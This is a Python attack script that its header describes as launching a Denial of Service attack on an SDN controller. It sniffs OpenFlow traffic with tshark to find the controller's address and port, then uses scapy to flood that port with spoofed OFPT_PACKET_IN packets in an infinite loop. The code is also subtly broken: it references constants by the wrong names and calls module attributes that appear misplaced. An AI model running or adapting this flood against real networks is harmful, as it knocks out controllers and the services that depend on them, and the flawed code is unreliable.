# Author: Shikha Suneja
# Purpose: A python script to initiate a Denial of Service (DoS) attack on the SDN controller
#!/usr/bin/python3.4

import subprocess
import re
import os
from scapy.all import *
from scapy.contrib import openflow as op

CAP_FILTER = "tcp"
INTERFACE = "eth0"
DURATION = "duration:15"
DISP_FILTER = "of13.packet_in.type == 10"                    # to display the required OFPT messages

def get_ctrl_details():
        #start the capture
        command = ['sudo', 'tshark', '-i', interface , '-f', cap_filter, '-Y', disp_filter, '-a', duration, '-T', 'fields', '-e', 'ip.dst', '-e', 'tcp.dstport']
        output = (subprocess.check_output(command)).decode("utf-8")
        packet = list(set(output.split()))                       # Separating all the packets
        for item in packet:
            if "." in item:
                ctrl_ip = item
            else:
                ctrl_port = item
        return ctrl_ip, ctrl_port

def attack_ctrl(ctrl_ip, ctrl_port):
        print("Sending OFPT_PACKET_IN messages to the controller")
        seq_num = 0
        while True:
            pkt = op.Ether()/IP(dst=ctrl_ip, src='192.168.56.3')/op.TCP(sport=41570, dport=int(ctrl_port), seq=seq_num)/op.OFPTPacketIn()
            #pkt.show()
            sendp(pkt, iface = interface)
            seq_num += 1

if __name__ == "__main__":
        ctrl_ip, ctrl_port = get_ctrl_details()
        #print("The controller's ip is {} and the port is {}.".format(ctrl_ip, ctrl_port))
        #attack_ctrl(ctrl_ip, ctrl_port)

